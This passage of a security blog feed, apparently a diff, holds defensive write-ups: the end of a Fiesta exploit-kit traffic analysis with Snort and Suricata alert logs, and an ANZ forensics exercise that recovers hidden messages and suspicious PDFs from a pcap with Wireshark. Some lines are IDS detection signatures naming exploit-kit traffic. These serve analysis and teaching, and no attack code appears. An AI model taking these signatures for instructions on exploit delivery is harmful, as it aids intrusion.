+09/25-02:51:27.571936  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51677 -&amp;gt; 205.234.186.112:80
+09/25-02:51:27.574725  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018408:1] ET CURRENT_EVENTS Fiesta PDF Exploit Download &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 205.234.186.112:80 -&amp;gt; 192.168.138.158:51677
+09/25-02:51:27.644398  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51713 -&amp;gt; 205.234.186.112:80
+09/25-02:51:27.731970  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51723 -&amp;gt; 205.234.186.112:80
+09/25-02:51:27.754655  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51725 -&amp;gt; 205.234.186.112:80
+09/25-02:51:27.755333  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51735 -&amp;gt; 205.234.186.112:80
+09/25-02:51:27.797567  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51751 -&amp;gt; 205.234.186.112:80
+09/25-02:51:27.861534  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2011582:46] ET POLICY Vulnerable Java Version 1.6.x Detected &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potentially Bad Traffic] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 2] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51989 -&amp;gt; 205.234.186.112:80
+09/25-02:51:27.861534  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2014912:6] ET CURRENT_EVENTS Unknown - Java Request  - gt 60char hex-ascii &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51989 -&amp;gt; 205.234.186.112:80
+09/25-02:51:27.861534  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2019611:6] ET CURRENT_EVENTS Fiesta Java Exploit/Payload URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51989 -&amp;gt; 205.234.186.112:80
+09/25-02:51:27.861534  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51989 -&amp;gt; 205.234.186.112:80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;suricata&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Suricata&lt;/code&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Offline input.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;suricata &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/suricata/suricata.yaml &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; ../../malware-analysis/20150118/1.pcap &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;fast.log | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4&lt;/span&gt;
+01/08/2015-18:51:31.706476  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:10] ET EXPLOIT_KIT Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Exploit Kit Activity Detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51682 -&amp;gt; 205.234.186.112:80
+01/08/2015-18:51:30.207155  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:10] ET EXPLOIT_KIT Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Exploit Kit Activity Detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51678 -&amp;gt; 205.234.186.112:80
+01/08/2015-18:51:29.324080  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:10] ET EXPLOIT_KIT Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Exploit Kit Activity Detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51666 -&amp;gt; 205.234.186.112:80
+01/08/2015-18:51:29.324080  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2014726:127] ET POLICY Outdated Flash Version M1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51666 -&amp;gt; 205.234.186.112:80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Reading &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eve.json&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evebox&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;evebox oneshot eve.json                                                                                                                                                              
+2021-09-24 23:23:10  INFO evebox::commands::oneshot: Using database filename ./oneshot.sqlite
+2021-09-24 23:23:11  INFO evebox::sqlite::init: Found event database schema version &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;        
+2021-09-24 23:23:11  INFO evebox::sqlite::init: Initializing SQLite database &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sqlite&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         
+2021-09-24 23:23:11  INFO evebox::sqlite::init: Updating SQLite database to schema version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sqlite&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                         
+2021-09-24 23:23:11  INFO evebox::sqlite::init: Updating SQLite database to schema version 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sqlite&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                         
+2021-09-24 23:23:11  INFO evebox::commands::oneshot: Reading eve.json &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;166509 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Here is how it looks like.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/fiesta/4.png&quot; title=&quot;fiesta/4.png&quot; alt=&quot;fiesta/4.png&quot; /&gt;
+          &lt;/div&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="blueteam" /><category term="ek" /><summary type="html">Description Analyze the following packet and answer the questions.</summary></entry><entry><title type="html">Cyber@ANZ - Digital Forensics</title><link href="https://jayngng.github.io/blog/cyberanz-digital-forensics/" rel="alternate" type="text/html" title="Cyber@ANZ - Digital Forensics" /><published>2021-09-23T02:56:47+10:00</published><updated>2021-09-23T02:56:47+10:00</updated><id>https://jayngng.github.io/blog/cyberanz---digital-forensics</id><content type="html" xml:base="https://jayngng.github.io/blog/cyberanz-digital-forensics/">&lt;h2 id=&quot;task-description&quot;&gt;&lt;strong&gt;Task Description&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;Suspicious network activity has been detected coming from a user on the ANZ network.&lt;/p&gt;
+
+&lt;p&gt;A laptop has been flagged up on our security systems due to suspicious internet traffic, and we need you to investigate the network traffic in order to establish what the user accessed and downloaded.&lt;/p&gt;
+
+&lt;p&gt;Your task is to examine their network activity and gather what information you can on what images they viewed and what files they accessed.&lt;/p&gt;
+
+&lt;p&gt;You have been provided with a packet capture file (pcap) containing all their recent network activity. There may be a number of artifacts contained within the packet capture file, and you will be expected to identify and report as many as possible.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;You must provide a report on everything you found, and document what processes / steps you followed to achieve this.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Download Packet: &lt;a href=&quot;https://cdn.theforage.com/vinternships/companyassets/AKkAyEwWc8wjPxx9n/Digital_Investigation%20Task%20(pcap%20file).pcapng&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;solutions&quot;&gt;&lt;strong&gt;Solutions&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;h4 id=&quot;packet-analyses&quot;&gt;&lt;strong&gt;Packet Analyses&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;I utilized the network analysis tool called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; to read the provided packet capture file.&lt;/p&gt;
+
+&lt;p&gt;Analysing the traffic, I discovered that most communications occurred via HTTP service, so I decided to filter the HTTP traffic using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http.request&lt;/code&gt; query.&lt;/p&gt;
+
+&lt;p&gt;As I further investigated the communications, I found out some interesting “&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt;” requests demonstrated by the following image.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/1.png&quot; title=&quot;ANZ_Digital_Forensics/1.png&quot; alt=&quot;ANZ_Digital_Forensics/1.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;I then took the next step by downloading those images.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; provides a capability to extract the objects in the HTTP traffic.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;From Wireshark, I navigated to &lt;strong&gt;&lt;em&gt;File&lt;/em&gt;&lt;/strong&gt; -&amp;gt; &lt;strong&gt;&lt;em&gt;Export Objects&lt;/em&gt;&lt;/strong&gt; -&amp;gt; &lt;strong&gt;&lt;em&gt;HTTP&lt;/em&gt;&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;There is a new Windows popped up -&amp;gt; Click &lt;strong&gt;&lt;em&gt;Save All&lt;/em&gt;&lt;/strong&gt; -&amp;gt; Pick a desired folder-&amp;gt; &lt;strong&gt;&lt;em&gt;Choose&lt;/em&gt;&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/2.png&quot; title=&quot;ANZ_Digital_Forensics/2.png&quot; alt=&quot;ANZ_Digital_Forensics/2.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;Here are the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5&lt;/code&gt; hashes of those images after they were downloaded:&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/3.png&quot; title=&quot;ANZ_Digital_Forensics/3.png&quot; alt=&quot;ANZ_Digital_Forensics/3.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;Analysing those images, I was able to spot a few dubious points.&lt;/p&gt;
+
+&lt;h4 id=&quot;sub-task-1&quot;&gt;&lt;strong&gt;Sub-task 1&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anz-logo.jpg&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bank-card.jpg&lt;/code&gt; are two images that show up in the users network traffic. Opened those images with an Image Viewer application, I obtained the following results.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anz-logo.jpg&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/4.png&quot; title=&quot;ANZ_Digital_Forensics/4.png&quot; alt=&quot;ANZ_Digital_Forensics/4.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bank-card.jpg&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/5.png&quot; title=&quot;ANZ_Digital_Forensics/5.png&quot; alt=&quot;ANZ_Digital_Forensics/5.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;h4 id=&quot;sub-task-2&quot;&gt;&lt;strong&gt;Sub-task 2&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;The network traffic for the images &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ1.jpg&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ2.jpg&lt;/code&gt; is more than it appears.&lt;/li&gt;
+  &lt;li&gt;Employing a tool called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; against the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ1.jpg&lt;/code&gt;, I discovered a hidden message.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/6.png&quot; title=&quot;ANZ_Digital_Forensics/6.png&quot; alt=&quot;ANZ_Digital_Forensics/6.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;I achieved the same result by inspecting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp stream 14”&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The Wireshark filter query is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp.stream eq 14&lt;/code&gt; -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Follow TCP Stream&lt;/code&gt;. At the end of the stream, the hidden message showed up.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/7.png&quot; title=&quot;ANZ_Digital_Forensics/7.png&quot; alt=&quot;ANZ_Digital_Forensics/7.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;Open the image with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HxD&lt;/code&gt; application, I could also retain the same output.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/hxd.png&quot; title=&quot;ANZ_Digital_Forensics/hxd.png&quot; alt=&quot;ANZ_Digital_Forensics/hxd.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;I followed the same techniques with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ2.jpg&lt;/code&gt; image and managed to allocate the hidden messages shown as below.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/8.png&quot; title=&quot;ANZ_Digital_Forensics/8.png&quot; alt=&quot;ANZ_Digital_Forensics/8.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;h4 id=&quot;sub-task-3&quot;&gt;&lt;strong&gt;Sub-task 3&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;how-to-commit-crimes.docx&lt;/code&gt; file type is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASCII&lt;/code&gt;. I could confirm that with the  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/9.png&quot; title=&quot;ANZ_Digital_Forensics/9.png&quot; alt=&quot;ANZ_Digital_Forensics/9.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;Here is how the content looks like on the wire.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/10.png&quot; title=&quot;ANZ_Digital_Forensics/10.png&quot; alt=&quot;ANZ_Digital_Forensics/10.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;h4 id=&quot;sub-task-4&quot;&gt;&lt;strong&gt;Sub-task 4&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;The user accessed three pdf documents: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ_Document.pdf&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ_Document2.pdf&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil.pdf&lt;/code&gt;. Inspecting those &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pdf&lt;/code&gt; respectively …&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ_Document.pdf&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/11.png&quot; title=&quot;ANZ_Digital_Forensics/11.png&quot; alt=&quot;ANZ_Digital_Forensics/11.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ_Document2.pdf&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/12.png&quot; title=&quot;ANZ_Digital_Forensics/12.png&quot; alt=&quot;ANZ_Digital_Forensics/12.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil.pdf&lt;/code&gt; file is suspicious with the following contents.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
